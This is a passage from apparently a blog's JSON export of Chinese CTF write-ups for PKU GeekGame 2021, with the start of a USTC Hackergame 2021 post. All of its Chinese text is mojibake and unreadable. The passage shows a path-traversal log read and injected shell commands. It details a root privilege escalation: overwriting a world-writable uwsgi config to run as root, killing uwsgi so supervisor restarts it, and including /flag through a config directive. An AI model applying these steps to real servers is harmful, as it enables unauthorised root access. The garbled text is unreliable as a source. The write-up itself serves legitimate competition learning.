/usr/bin/gpasswd /usr/bin/newgrp /usr/bin/chfn /usr/lib/openssh/ssh-keysign $ ls -al /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 481608 Mar 13 2021 /usr/lib/openssh/ssh-keysign çœ‹äº†ä¸€ä¸‹å‘ç°è¿™å‡ ä¸ªè²Œä¼¼éƒ½ä¸èƒ½æ‰§è¡Œå§â€¦â€¦ /module?log=../../../../../../../tmp/supervisor.log # /tmp/supervisord.log 2021-11-18 08:35:57,151 CRIT Supervisor is running as root. Privileges were not dropped because no user is specified in the config file. If you intend to run as root, you can set user=root in the config file to avoid this message. 2021-11-18 08:35:57,153 INFO supervisord started with pid 8 2021-11-18 08:35:58,156 INFO spawned: 'chatbot' with pid 52 2021-11-18 08:35:58,158 INFO spawned: 'uwsgi' with pid 53 2021-11-18 08:36:03,393 INFO success: chatbot entered RUNNING state, process has stayed up for &gt; than 5 seconds (startsecs) 2021-11-18 08:36:03,393 INFO success: uwsgi entered RUNNING state, process has stayed up for &gt; than 5 seconds (startsecs) $ ps -ef UID PID PPID C STIME TTY TIME CMD root 1 0 0 08:35 ? 00:00:00 /sbin/docker-init -- sh run.sh root 8 1 0 08:35 ? 00:00:01 /usr/local/bin/python /usr/local/bin/supervisord -n -c /etc/supervisor-ctf.conf root 14 8 0 08:35 ? 00:00:00 socat UNIX-LISTEN:/sock/socat.sock,fork,reuseaddr TCP4:127.0.0.1:8080 root 16 1 0 08:35 ? 00:00:00 nginx: master process nginx -c /etc/nginx/nginx.conf www-data 17 16 0 08:35 ? 00:00:00 nginx: worker process www-data 18 16 0 08:35 ? 00:00:00 nginx: worker process www-data 19 16 0 08:35 ? 00:00:00 nginx: worker process www-data 20 16 0 08:35 ? 00:00:00 nginx: worker process www-data 21 16 0 08:35 ? 00:00:00 nginx: worker process www-data 22 16 0 08:35 ? 00:00:00 nginx: worker process www-data 23 16 0 08:35 ? 00:00:00 nginx: worker process www-data 24 16 0 08:35 ? 00:00:00 nginx: worker process www-data 25 16 0 08:35 ? 00:00:00 nginx: worker process www-data 26 16 0 08:35 ? 00:00:00 nginx: worker process www-data 27 16 0 08:35 ? 00:00:00 nginx: worker process www-data 28 16 0 08:35 ? 00:00:00 nginx: worker process www-data 29 16 0 08:35 ? 00:00:00 nginx: worker process www-data 30 16 0 08:35 ? 00:00:00 nginx: worker process www-data 31 16 0 08:35 ? 00:00:00 nginx: worker process www-data 32 16 0 08:35 ? 00:00:00 nginx: worker process www-data 33 16 0 08:35 ? 00:00:00 nginx: worker process www-data 34 16 0 08:35 ? 00:00:00 nginx: worker process www-data 35 16 0 08:35 ? 00:00:00 nginx: worker process www-data 36 16 0 08:35 ? 00:00:00 nginx: worker process www-data 37 16 0 08:35 ? 00:00:00 nginx: worker process www-data 38 16 0 08:35 ? 00:00:00 nginx: worker process www-data 39 16 0 08:35 ? 00:00:00 nginx: worker process www-data 40 16 0 08:35 ? 00:00:00 nginx: worker process www-data 41 16 0 08:35 ? 00:00:00 nginx: worker process www-data 42 16 0 08:35 ? 00:00:00 nginx: worker process www-data 43 16 0 08:35 ? 00:00:00 nginx: worker process www-data 44 16 0 08:35 ? 00:00:00 nginx: worker process www-data 45 16 0 08:35 ? 00:00:00 nginx: worker process www-data 46 16 0 08:35 ? 00:00:00 nginx: worker process www-data 47 16 0 08:35 ? 00:00:00 nginx: worker process www-data 48 16 0 08:35 ? 00:00:00 nginx: worker process nobody 52 8 0 08:35 ? 00:00:00 python /usr/src/ufctf/chatbot.py nobody 53 8 0 08:35 ? 00:00:00 uwsgi --ini /tmp/uwsgi-ctf.ini nobody 56 53 0 08:35 ? 00:00:00 uwsgi --ini /tmp/uwsgi-ctf.ini nobody 57 53 0 08:35 ? 00:00:00 uwsgi --ini /tmp/uwsgi-ctf.ini nobody 69 57 0 08:39 ? 00:00:00 [sh] &lt;defunct&gt; nobody 132 57 0 08:47 ? 00:00:00 [sh] &lt;defunct&gt; nobody 141 57 0 08:49 ? 00:00:00 [sh] &lt;defunct&gt; nobody 152 56 0 08:51 ? 00:00:00 [sh] &lt;defunct&gt; nobody 159 56 0 08:52 ? 00:00:00 [sh] &lt;defunct&gt; nobody 182 57 0 08:55 ? 00:00:00 [sh] &lt;defunct&gt; nobody 198 57 0 08:59 ? 00:00:00 [sh] &lt;defunct&gt; nobody 207 56 0 09:00 ? 00:00:00 [sh] &lt;defunct&gt; nobody 216 56 0 09:09 ? 00:00:00 [sh] &lt;defunct&gt; nobody 223 56 0 09:10 ? 00:00:00 [sh] &lt;defunct&gt; nobody 249 56 0 09:32 ? 00:00:00 [sh] &lt;defunct&gt; nobody 255 56 0 09:33 ? 00:00:00 [sh] &lt;defunct&gt; nobody 264 56 0 09:34 ? 00:00:00 [sh] &lt;defunct&gt; nobody 273 56 0 09:35 ? 00:00:00 [sh] &lt;defunct&gt; nobody 282 56 0 09:37 ? 00:00:00 [sh] &lt;defunct&gt; nobody 295 56 1 09:45 ? 00:00:00 [sh] &lt;defunct&gt; root 303 14 0 09:45 ? 00:00:00 socat UNIX-LISTEN:/sock/socat.sock,fork,reuseaddr TCP4:127.0.0.1:8080 nobody 304 56 0 09:45 ? 00:00:00 /bin/sh -c ps -ef &gt; /tmp/miao; echo test nobody 305 304 0 09:45 ? 00:00:00 ps -ef è¿™é‡Œé¢å¯ç–‘çš„æœ‰ nginxï¼Œsocatï¼Œsupervisordã€‚ $ pip list Package Version ------------------ -------- click 8.0.3 Flask 2.0.2 importlib-metadata 4.8.2 itsdangerous 2.0.1 Jinja2 3.0.3 MarkupSafe 2.0.1 pip 21.2.4 setuptools 57.5.0 supervisor 4.2.2 typing-extensions 3.10.0.2 uWSGI 2.0.20 Werkzeug 2.0.2 wheel 0.37.0 zipp 3.6.0 supervisor æŒºæ–°çš„ï¼Œæ²¡æœ‰ RCE çš„ CVE äº†ã€‚ é€šè¿‡ nginx.conf è¿›ä¸€æ­¥è¯»åˆ°ç½‘é¡µé…ç½®æ–‡ä»¶ nginx-ctf.conf upstream uwsgi { # server unix:///path/to/your/mysite/mysite.sock; # for a file socket server 127.0.0.1:3031; } # configuration of the server server { # the port your site will be served on listen 8080; # the domain name it will serve for server_name localhost; charset utf-8; # max upload size client_max_body_size 2M; # adjust to taste # Django media location /media/ { alias /usr/files/media/; # your Django project's media files - amend as required } location /static/ { alias /usr/files/static/; # your Django project's static files - amend as required } # Finally, send all non-media requests to the uwsgi location / { uwsgi_pass uwsgi; include /etc/nginx/uwsgi_params; # the uwsgi_params file you installed } } å¯ä»¥çŸ¥é“æ˜¯ä»£ç†äº† 8080 ç«¯å£ç»™ uwsgi åç«¯ 127.0.0.1:3031ï¼Œè€Œ run.sh é‡Œæœ‰ä¸ª socat socat UNIX-LISTEN:/sock/socat.sock,fork,reuseaddr TCP4:127.0.0.1:8080 &amp; ä»–æŠŠè¿™ä¸ª 8080 åˆ fork åˆ°äº† /sock/socat.sockï¼Œå¯èƒ½æ˜¯ä¸ºäº† docker éƒ¨ç½²ç”¨çš„ï¼Ÿä¸æ‡‚äº†ã€‚ å†å›å»çœ‹ supervisord å’Œ uwsgi çš„é…ç½®æ–‡ä»¶ï¼Œå‘ç°è¿™ä¸ª uwsgi-ctf.ini å¯å†™å•Šï¼ -rw-rw-rw- 1 root root 210 Nov 11 18:21 /tmp/uwsgi-ctf.ini è€Œä¸” uwsgi æ˜¯å¯ä»¥è‡ªåŠ¨é‡å¯çš„ã€‚ é‚£å°±å¯ä»¥æŠŠé‡Œé¢çš„ nobody æ¢æˆ rootï¼Œç„¶å kill æ‰åŸæ¥çš„è®© supervisor é‡å¯ï¼Œä¸å°±å®Œäº‹äº†ï¼ # sed -i 's/nobody/root/g' /tmp/uwsgi-ctf.ini # ç„¶è€Œä¸æ‡‚ä¸ºå•¥æ²¡æ”¹æˆåŠŸï¼Œäºæ˜¯å…ˆå†™åˆ°åˆ«çš„æ–‡ä»¶ï¼Œå†è¦†ç›–è¿‡å»ï¼Œè¿™é‡Œè¦†ç›–å°±åˆ«ç”¨expé‡Œçš„äº†ï¼Œè¾“å‡ºé‡å®šå‘è¿™é‡Œå•ç‹¬å†™ $ sed 's/nobody/root/g' /tmp/uwsgi-ctf.ini &gt; /tmp/test $ cat /tmp/test &gt; /tmp/uwsgi-ctf.ini ï¼ˆèµ›åçœ‹å…¶ä»–å¸ˆå‚…wpï¼ŒåŸå› åº”è¯¥æ˜¯ sed æ›¿æ¢çš„æ—¶å€™éœ€è¦åˆ›å»ºä¸´æ—¶æ–‡ä»¶ï¼Œä½†é¢˜ç›®æ²¡æ³•åˆ›å»ºä¸´æ—¶æ–‡ä»¶ ç„¶åå†çœ‹è¿™ä¸ªæ–‡ä»¶ï¼Œå‘ç°å°±æ”¹å¥½äº†ã€‚ å†æŠŠ uwsgi kill æ‰ã€‚ $ pkill -9 uwsgi ç­‰ä¸€ä¼šå„¿ï¼Œå‘ç°ä¼šæœ‰ä¸€æ®µæ—¶é—´ 502 äº†ï¼Œè€Œååˆæ¢å¤äº†ã€‚ å¯ä»¥çœ‹çœ‹ /tmp/supervisord.logï¼Œå‘ç°ç¡®å®é‡å¯äº†ã€‚ çœ‹å½“å‰ç”¨æˆ·ï¼Œå°±å‘ç°æ˜¯ root äº†ã€‚ é‚£å°±èƒ½è¯» flag äº†ï¼Œå¥½è€¶ï¼å¤ªé¡¶äº†å•Šï¼ï¼ï¼ flag{UWSG1_is_n0t_SafE_wheN_SSrf} å¦å¤–ï¼Œè¿˜å¯ä»¥é€šè¿‡æ”¹ uwsgi é…ç½®æ–‡ä»¶ï¼Œç”¨ print = @(/flag) çš„å½¢å¼æ¥æŠŠ /flag åŒ…å«è¿›æ¥ä½œä¸ºå¯åŠ¨æ—¶æ‰“å°çš„ä¿¡æ¯ï¼Œç„¶ååˆ©ç”¨ä»»æ„è¯»æ–‡ä»¶æ¼æ´æ¥è¯»æ—¥å¿—æ–‡ä»¶ /tmp/supervisor.log è¯¡å¼‚çš„ç½‘å…³ 2021å¹´ï¼Œå°å’•ç»ˆäºæŠŠæ“ä½œç³»ç»Ÿä» XP å‡çº§åˆ°äº† Win 7ï¼æ­£å¦‚èº«è¾¹åŒå­¦çš„è£…æœºå¿…å¤‡è½¯ä»¶æ˜¯ 2345 æµè§ˆå™¨ã€360 å®‰å…¨å«å£«ï¼Œå°å’•åˆšè£…å¥½ç³»ç»Ÿå°±è¦å®‰è£…åŒ—å¤§ç½‘å…³å®¢æˆ·ç«¯ã€‚ å°å’•ç†Ÿç»ƒçš„æ‰“å¼€ itsï¼Œä¸‹è½½ï¼Œå®‰è£…ï¼Œå®Œæˆï¼ ä½†è¿™æ¬¡çš„ç¨‹åºï¼Œå¥½åƒâ€¦â€¦æœ‰ç‚¹ä¸ä¸€æ ·ï¼Ÿä¼šä¸ä¼šæ˜¯è¢«é»‘å®¢ç¯¡æ”¹è¿‡äº†ï¼Ÿ ç‚¹å‡» â€œæ‰“å¼€/ä¸‹è½½é¢˜ç›®â€ ä¸‹è½½é¢˜ç›®é™„ä»¶ æ­¤ç¨‹åºä¸“ä¸ºæœ¬é¢˜è€Œè®¾è®¡ï¼Œè¯·å‹¿ç”¨äºå…¶ä»–ç”¨é€” æç¤ºï¼šæ¢ç´¢ç¨‹åºçš„ UI å¯èƒ½å¸¦æ¥æ„å¤–æ”¶è·ã€‚ ä¸‹è½½ä¸‹æ¥ï¼Œæ‹–è¿› IDAï¼Œè¿™å•¥å•Šï¼Œç®—äº†ä¸é€†äº†ã€‚ æ‰§è¡Œç¨‹åºï¼Œå‘ç° UserID ä¸‹é¢æœ‰ä¸ª flagï¼ŒPassword ä¹Ÿä¿å­˜äº†ï¼Œå°±è¿™ä¸ªäº†å§ã€‚ æ‰“å¼€ x64dbgï¼Œå¼€å§‹åŠ¨æ€è°ƒè¯•ï¼Œè°ƒäº†è°ƒï¼Œç®—äº†ï¼Œæ‘¸äº†ã€‚ ç›´æ¥æ‹¿å‡º æ˜Ÿå·å¯†ç æŸ¥çœ‹å™¨ æ‹–åŠ¨å°±å®Œäº‹äº†ã€‚ï¼ˆå–µå–µæ‡’æ‡’.jpg flag{h0w_diD_you_g3T_th3_passw0rd?} æ‰«é›· å°å’•æ›¾æ˜¯éƒ¨é˜Ÿé‡Œè´Ÿè´£æ‰«é›·çš„å·¥å…µï¼Œé€€å½¹ä¹‹åï¼Œè¿·ä¸Šäº†ç”µè„‘ä¸Šè‡ªå¸¦çš„æ‰«é›·æ¸¸æˆã€‚ ä»¥ä»–çš„è¯è¯´ï¼Œâ€œè¿™æ˜¯é€Ÿåº¦ä¸ç²¾åº¦çš„å®Œç¾ç»“åˆâ€ã€‚ 2021å¹´ï¼Œå°å’•ç»ˆäºæŠŠæ“ä½œç³»ç»Ÿä» XP å‡çº§åˆ°äº† Win 7ï¼æ­£å¦‚èº«è¾¹çš„äººæŠ±æ€¨ Win 11 çš„åè€Œä¸å®ï¼Œå°å’•ä¹Ÿæ„Ÿè§‰å‡çº§åçš„æ‰«é›·æ¸¸æˆå¤±å»äº†æŸç§æœ´ç´ çš„å‘³é“ã€‚ ä½†ä»–å´æ— å¤„æ³„æ„¤ã€‚ äºæ˜¯ï¼Œå°å’•å†³å®šè‡ªå­¦ç¼–ç¨‹ï¼Œå®ç°è‡ªå·±å¿ƒä¸­å®Œç¾çš„æ‰«é›·æ¸¸æˆã€‚é‰´äºç©å®¶æ°´å¹³å„å¼‚ï¼Œå°å’•è¿˜å®ç°äº† Easy æ¨¡å¼ï¼Œä»¥çºªå¿µé¦–æ¬¡ä¸Šé˜µå°±è¸©é›·çš„åŒå¿—ä»¬ã€‚ ä½ å¯ä»¥ ä¸‹è½½æœ¬é¢˜çš„ç¨‹åº ç‚¹å‡» â€œæ‰“å¼€/ä¸‹è½½é¢˜ç›®â€ å°†æ‰“å¼€ç½‘é¡µç»ˆç«¯ï¼Œä½ ä¹Ÿå¯ä»¥é€šè¿‡å‘½ä»¤ nc prob09.geekgame.pku.edu.cn 10009 æ‰‹åŠ¨è¿æ¥åˆ°é¢˜ç›® æç¤ºï¼šå›°éš¾æ¨¡å¼å¯¹åº” Flag 1ï¼Œç®€å•æ¨¡å¼å¯¹åº” Flag 2ã€‚ ç¬¬äºŒé˜¶æ®µæç¤º äº†è§£ä¸€ä¸‹ Python éšæœºæ•°çš„å®ç°ã€‚ ç»™äº†æºç  #!/usr/bin/env python3 import random import signal import functools print = functools.partial(print, flush=True) from mylib import show_flag WIDTH = 16 HEIGHT = 16 ROUND_LIMIT = 2000 def gen_board(): bits = random.getrandbits(WIDTH * HEIGHT) board = [[None] * WIDTH for _ in range(HEIGHT)] for i in range(HEIGHT): for j in range(WIDTH): x = (bits &gt;&gt; (i * WIDTH + j)) &amp; 1 board[i][j] = x return board def check_win(board, marks): for i in range(HEIGHT): for j in range(WIDTH): if board[i][j] == 0 and not marks[i][j]: return False return True def near_count(board, x, y): delta = [[1,0],[-1,0],[0,1],[0,-1],[1,1],[1,-1],[-1,1],[-1,-1]] count = 0 for d in delta: tx, ty = x + d[0], y + d[1] if 0 &lt;= tx &lt; HEIGHT and 0 &lt;= ty &lt; WIDTH: count += board[tx][ty] return count def show_board(board): for i in range(HEIGHT): for j in range(WIDTH): if board[i][j]: print(\"*\", end='') else: print(near_count(board, i, j), end='') print() def run(easy_mode): signal.alarm(600) count = 0 while True: board = gen_board() count += 1 marks = [[False] * WIDTH for _ in range(HEIGHT)] steps = 0 print(\"New Game!\") while not check_win(board, marks): x, y = input(\"&gt; \").split() x, y = int(x), int(y) if board[x][y] != 0: if easy_mode and steps == 0: while board[x][y] != 0: board = gen_board() else: print(\"BOOM!\") show_board(board) break marks[x][y] = True print(near_count(board, x, y)) steps += 1 else: # win print(\"You win the game in %d steps!\" % steps) show_flag(easy_mode) break if count &gt;= ROUND_LIMIT: break print() t = input(\"try again? (y/n)\") if t != 'y': print(\"bye\") break if __name__ == \"__main__\": print(\"Welcome to the minesweeper game!\") t = input(\"easy mode? (y/n)\") easy_mode = t == 'y' run(easy_mode) å¤§æ¦‚æ€è·¯å°±æ˜¯ï¼Œå…ˆå°½å¯èƒ½å¤±è´¥ä¸€å †ï¼Œæ‹¿åˆ°æ•´ä¸ªæ£‹ç›˜ï¼Œç„¶åæ®æ­¤ç®—å‡ºåŸå§‹çš„éšæœºæ•°ã€‚é€šè¿‡ python éšæœºæ•°æœºåˆ¶æ¨æ–­å‡ºä¸‹ä¸€æ¬¡çš„æ£‹ç›˜ï¼Œå†å»è§£æ‰«é›·å°±å®Œäº‹äº† ï¼ˆç”±äºè¿™é¢˜æ˜¯æœ€åä¸€å¤©å‡Œæ™¨çœ‹çš„ï¼Œå½“å¤©ç™½å¤©è¿˜æœ‰å…¶ä»–æ¯”èµ›ï¼Œè¿™ä¸ªè¿˜è¦å†™äº¤äº’ï¼Œäºæ˜¯æ‘¸äº†.jpg çœ‹çœ‹ Python çš„éšæœºæ•°æœºåˆ¶ã€‚ å‡ ä¹æ‰€æœ‰æ¨¡å—å‡½æ•°éƒ½ä¾èµ–äºåŸºæœ¬å‡½æ•° random() ï¼Œå®ƒåœ¨åŠå¼€æ”¾åŒºé—´ [0.0,1.0) å†…å‡åŒ€ç”Ÿæˆéšæœºæµ®ç‚¹æ•°ã€‚ Python ä½¿ç”¨ Mersenne Twister ä½œä¸ºæ ¸å¿ƒç”Ÿæˆå™¨ã€‚ å®ƒäº§ç”Ÿ 53 ä½ç²¾åº¦æµ®ç‚¹æ•°ï¼Œå‘¨æœŸä¸º 2**19937-1 ï¼Œå…¶åœ¨ C ä¸­çš„åº•å±‚å®ç°æ—¢å¿«åˆçº¿ç¨‹å®‰å…¨ã€‚ Mersenne Twister æ˜¯ç°å­˜æœ€å¹¿æ³›æµ‹è¯•çš„éšæœºæ•°å‘ç”Ÿå™¨ä¹‹ä¸€ã€‚ ä½†æ˜¯ï¼Œå› ä¸ºå®Œå…¨ç¡®å®šæ€§ï¼Œå®ƒä¸é€‚ç”¨äºæ‰€æœ‰ç›®çš„ï¼Œå¹¶ä¸”å®Œå…¨ä¸é€‚åˆåŠ å¯†ç›®çš„ã€‚ random.getrandbits(k) è¿”å›å…·æœ‰ k ä¸ªéšæœºæ¯”ç‰¹ä½çš„éè´Ÿ Python æ•´æ•°ã€‚ æ­¤æ–¹æ³•éš MersenneTwister ç”Ÿæˆå™¨ä¸€èµ·æä¾›ï¼Œå…¶ä»–ä¸€äº›ç”Ÿæˆå™¨ä¹Ÿå¯èƒ½å°†å…¶ä½œä¸º API çš„å¯é€‰éƒ¨åˆ†æä¾›ã€‚ åœ¨å¯èƒ½çš„æƒ…å†µä¸‹ï¼Œgetrandbits() ä¼šå¯ç”¨ randrange() æ¥å¤„ç†ä»»æ„å¤§çš„åŒºé—´ã€‚ åœ¨ 3.9 ç‰ˆæ›´æ”¹: æ­¤æ–¹æ³•ç°åœ¨æ¥å—é›¶ä½œä¸º k çš„å€¼ã€‚ via https://docs.python.org/zh-cn/3/library/random.html ï¼ˆåé¢å†æ¥å¤ç°å§ï¼Œç†è®ºä¸Šæ‹¿ä¸ªç°æˆçš„åº“é¢„æµ‹ä¸€ä¸‹å°±è¡Œå§ å°ç»“å¥½éš¾å•Šï¼Œå¤ªé¡¶äº†å§ï¼ æœ€åæ‹¿äº† 39 åï¼Œæ‹¿äº†ä¸ªä¸€è¡€ï¼Œæ‘¸äº†ã€‚ æ„Ÿè§‰é¢˜ç›®æŒºç»•çš„æŒºå¥—çš„ï¼Œä¸€é“é¢˜åšä¸€å¤©ï¼Œä¸å¯¹ï¼Œæ˜¯ä»ç¬¬ä¸€å¤©çœ‹åˆ°æœ€åä¸€å¤©ä¹Ÿæ²¡åšå‡ºæ¥â€¦â€¦ æ¯”å¦‚è¯´ Flagå³æœåŠ¡ é‚£é¢˜æœ¬æ¥ç¬¬äºŒé—®æ‹¿äº†ä¸ªäºŒè¡€ï¼ˆæ²¡æŠ¢åˆ°ä¸€è¡€å“­å“­ï¼‰ï¼Œäºæ˜¯æƒ³æŠ¢ç¬¬ä¸‰é—®ä¸€è¡€çš„ï¼Œç»“æœåˆ°äº†æœ€åä¸€å¤©å‘ç°å…¶ä»–é—®é¢˜éƒ½è§£å†³äº†ï¼Œå°±å¡åœ¨å¸¦æœ‰è¿‡æ»¤çš„æœ‰é™é•¿åº¦çš„ä»£ç æ‰§è¡Œä¸Šäº†ï¼Œå®³ï¼Œå…¶å®å°±æ˜¯ jsfuck æ²¡å¥½å¥½ä¼˜åŒ–å•¦ï¼ˆï¼ˆï¼ˆåˆ«éª‚äº† æœ¬å±Šç«èµ›å°†ç»§ç»­è¿½æ±‚ é¢˜ç›®æ–°é¢–æœ‰è¶£ã€éš¾åº¦å…·æœ‰æ¢¯åº¦ï¼Œè®©æ²¡æœ‰ç›¸å…³ç»éªŒçš„æ–°ç”Ÿå’Œå…·æœ‰ä¸€å®šä¸“ä¸šåŸºç¡€çš„å­¦ç”Ÿéƒ½èƒ½äº«å—æ¯”èµ›ï¼Œåœ¨å­¦ä¹ çš„è¿‡ç¨‹ä¸­æœ‰æ‰€æ”¶è·ã€‚ é¢˜ç›®é‡Œé¢è¿˜åŸ‹äº†æŒºå¤šæ¢—ï¼Œä½†æ„Ÿè§‰éš¾åº¦æ¢¯åº¦æœ‰ç‚¹å¤§ï¼Œå®¹æ˜“åŠé€€ï¼Œè€Œä¸”è¿™æ‰“èµ·æ¥å¤ªèŠ±æ—¶é—´å¤ªæŠ˜è…¾å–µå–µå•¦ï¼Œæ¯æ¬¡çœ‹ç€ä»¥ä¸ºé©¬ä¸Šå‡ºç»“æœæ€»æœ‰ä¸‹ä¸€å±‚ç­‰ç€ä½ ã€‚ ä¸è¿‡è¯è¯´å›æ¥ï¼Œé¢˜ç›®å¥—çš„ç‚¹æ¯”è¾ƒå¤šï¼Œä»å­¦ä¹ çš„è§’åº¦è€Œè¨€çœ‹ writeup æ¥å­¦ä¹ çš„è¯æ”¶è·è¿˜æ˜¯ä¸å°‘çš„ï¼ŒOrzï¼ ï¼ˆu1s1ï¼Œæ‰“è¿™ä¸ªæ¯”èµ›å¤ªç´¯äº† ç›¸å…³èµ„æº æ¯”èµ›å¹³å°ï¼š https://geekgame.pku.edu.cn/ å®˜æ–¹èµ„æ–™å­˜æ¡£åŠé¢˜è§£ repoï¼š 1st PKU GeekGame taokyâ€™s GeekGame v1 (2021) writeups etc. ï¼ˆæºœäº†æºœäº†å–µ~","path":"2021/11/25/CTF_2021PKUGeekGame/"},{"title":"CTF | 2021 USTC Hackergame WriteUp","text":"ï¼ˆä¸çŸ¥é“æ”¾ä»€ä¹ˆå›¾å¥½ï¼Œé‚£å°±æ‰¾å¼ æµ·æŠ¥å½“é¢˜å›¾å§ï¼‰ å‰è¨€ ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦ç¬¬å…«å±Šä¿¡æ¯å®‰å…¨å¤§èµ› æ¯”èµ›æ—¶é—´ï¼š åŒ—äº¬æ—¶é—´ 2021 å¹´ 10 æœˆ 23 æ—¥ ä¸­åˆ 12:00 ï½ 10 æœˆ 30 æ—¥ ä¸­åˆ 12:00ï¼ˆå…±ä¸ƒå¤©ï¼‰ï¼›æ·»åŠ åˆ°æ—¥å† ä¸ºäº†è®©å‚èµ›çš„åŒå­¦ä»¬æ›´å¥½åœ°å¹³è¡¡å­¦ä¹ å’Œæ¯”èµ›ï¼ŒæŒ‰ç…§ä¼ ç»Ÿï¼Œæˆ‘ä»¬å°†äº 10 æœˆ 24 æ—¥ï¼ˆå‘¨æ—¥ï¼‰æ™š 20:00 è‡³ 10 æœˆ 25 æ—¥ï¼ˆå‘¨ä¸€ï¼‰æ—© 8:00 æœŸé—´å…³é—­æ¯”èµ›å¹³å°ã€‚åœ¨æ­¤æœŸé—´é€‰æ‰‹ä»¬å¯ä»¥å¥½å¥½ä¼‘æ¯ï¼Œå®Œæˆè‡ªå·±çš„ä½œä¸šï¼Œå‡†å¤‡è¿æ¥æ–°çš„ä¸€å‘¨ã€‚ èµ›åˆ¶ï¼š ä¸ªäººçº¿ä¸Šèµ›ï¼Œè§£é¢˜æ¨¡å¼ï¼Œçº¦ 25 é“é¢˜ç›®ï¼Œæœ‰å®æ—¶æ’è¡Œæ¦œã€‚ æ¯”èµ›é¢˜ç›®åˆ†ä¸º 4 ç±»ï¼Œåˆ†ç±»å¦‚ä¸‹ï¼š ç»¼åˆæŠ€èƒ½ï¼ˆgeneralï¼‰ ç¨‹åºé€†å‘ä¸æ¼æ´åˆ©ç”¨ï¼ˆbinaryï¼‰ å¯†ç å­¦ä¸æ•°å­¦ï¼ˆmathï¼‰ ç½‘ç«™å®‰å…¨ï¼ˆwebï¼‰ https://hack.lug.ustc.edu.cn/ ä¸€å¹´ä¸€åº¦çš„ USTC Hackergame åˆæ¥äº†å–µï¼ é¡ºä¾¿ï¼Œå–µå–µ Hackergame 2020 çš„ Writeup è¯¦è§ï¼š CTF | 2020 USTC Hackergame WriteUp è¿™æ¬¡æ¯”èµ›å¤§éƒ¨åˆ†é¢˜ç›®çš„é¢˜è§£æ˜¯è¾¹åšè¾¹å†™çš„ï¼Œæ‰€ä»¥ä¸å…¶è¯´æ˜¯é¢˜è§£ï¼Œä¸å¦‚è¯´æ˜¯ è§£é¢˜çš„è¿‡ç¨‹è®°å½•ï¼Œä½ å¯ä»¥è®¤ä¸ºè¿™ç¯‡åšå®¢é‡Œæ˜¯ä¸€å †åºŸè¯ï¼Œé‡Œé¢ å¯èƒ½åŒ…å«äº†é”™è¯¯æˆ–è€…æœ‰å¯èƒ½è¯¯å¯¼æ­£ç¡®è§£é¢˜çš„å†…å®¹ï¼Œè¿™å¤ªæ­£å¸¸äº† hhhã€‚ ç”±äºæœ€è¿‘æ¯”è¾ƒå¿™ï¼Œæœ¬æ¥è¿˜æƒ³å¤ç°å‡ é“é¢˜å†å‘åšå®¢çš„ï¼Œå‘ç°ä¸€ä¸å°å¿ƒå’•äº†ï¼Œæƒ³æƒ³è¿˜æ˜¯ç®—äº†ï¼Œç›´æ¥å‘å‡ºæ¥å§ã€‚ï¼ˆæ‘Šæ‰‹.jpg åé¢å¯èƒ½è¿˜ä¼šé™†ç»­å¤ç°æ›´æ–°ï¼Œå¤§æ¦‚å¯èƒ½ä¼°è®¡å§ï¼Œæ¯•ç«Ÿé¢˜ç›®å‡ºå¾—è¿˜æ˜¯å¾ˆä¸é”™çš„~ ç­¾åˆ° ä¸ºäº†èƒ½è®©å¤§å®¶é¡ºåˆ©ç­¾åˆ°ï¼Œå‘½é¢˜ç»„æŠŠæ¯ä¸€ç§’çš„ flag éƒ½è®°å½•ä¸‹æ¥åˆ¶æˆäº†æ—¥è®°æœ¬çš„ä¸€é¡µã€‚ä½ åªéœ€è¦æ‰“å¼€æ—¥è®°ï¼Œç¿»åˆ° Hackergame 2021 æ¯”èµ›è¿›è¡ŒæœŸé—´çš„ä»»ä½•ä¸€é¡µå°±èƒ½å¾—åˆ° flagï¼ æç¤ºï¼šå®Œæˆé¢˜ç›®é‡åˆ°å›°éš¾ï¼Ÿä½ å¯ä»¥å‚è€ƒ 2018 å¹´ç­¾åˆ°é¢˜é¢˜è§£ã€2019 å¹´ç­¾åˆ°é¢˜é¢˜è§£ å’Œ 2020 å¹´ç­¾åˆ°é¢˜é¢˜è§£ã€‚ http://202.38.93.111:10000/?token=xxxxxxx æ˜¯å»å¹´é‚£ä¸ª FLAG æå–å™¨ çš„èƒŒæ™¯ï¼ï¼ˆè·‘ è¯•äº†ä¸€ä¸‹ï¼Œå¾ˆæ˜æ˜¾è¿™ä¸ªå‚æ•° page å°±æ˜¯æ—¶é—´æˆ³å•¦~ æ¯”å¦‚ç°åœ¨çš„è¯å°±è®¿é—® http://202.38.93.111:10000/?page=1634984522 å®Œäº‹äº†ã€‚ è¿›åˆ¶åå…­â€”â€”å‚ä¸Š ä¸ºä¸¥é˜² flag æ³„æ¼ä»¥åŠå…¶ä»–å­˜åœ¨äºæœªæ¥æ‰€æœ‰å¯èƒ½çš„æ„å¤–ç¾éš¾ï¼Œç¥é€šå¹¿å¤§çš„ Z åŒå­¦ä¸ä»…å¼ºåˆ¶è¦æ±‚æ¯ä¸€é“é¢˜ç›®éƒ½åŠ ä¸Šæƒé™å’Œèµ„æºçš„é™åˆ¶ï¼Œè¿˜ç»™æ‰€æœ‰å‚ä¸ Hackergame 2021 å‘½é¢˜çš„è®¡ç®—æœºæ–½åŠ äº†ä¸€å±‚æ³•æœ¯ç»“ç•Œã€‚ä»»ä½•è¯•å›¾ä»ç»“ç•Œé€ƒé€¸çš„ flag éƒ½ä¼šè¢«æ— æƒ…æŠ¹é™¤ã€‚ è€Œä¸€ä½æ˜é¢ä¸Šæ˜¯è®¡ç®—æœºå­¦é™¢çš„æ–°ç”Ÿï¼Œå®åˆ™ä¸ºç‰©ç†å­¦é™¢æš—éƒ¨æ ¸å¿ƒæˆå‘˜çš„ X åŒå­¦ï¼Œåœ¨ Hackergame 2021 å‘½é¢˜ç»„å·²ç»æ½œä¼å¤šæ—¶ã€‚å¦„æƒ³è¶æ¯”èµ›å¼€å§‹çš„åˆæ—¶ï¼Œå€Ÿé˜³ç«æ­£æ—ºä¹‹åŠ¿ï¼Œå†²ç ´ Z åŒå­¦çš„ç»“ç•Œï¼Œä»¥å›¾ç‰‡è€Œéæ˜æ–‡çš„å½¢å¼ï¼Œå°† flag æ‚„æ‚„ä¼ é€’å‡ºæ¥ã€‚ å¥½åœ¨ Z åŒå­¦æ³•åŠ›ä¹‹æ·±åšï¼Œä¸å¯ç®¡çª¥è ¡æµ‹ã€‚åœ¨ flag è¢«ä¼ 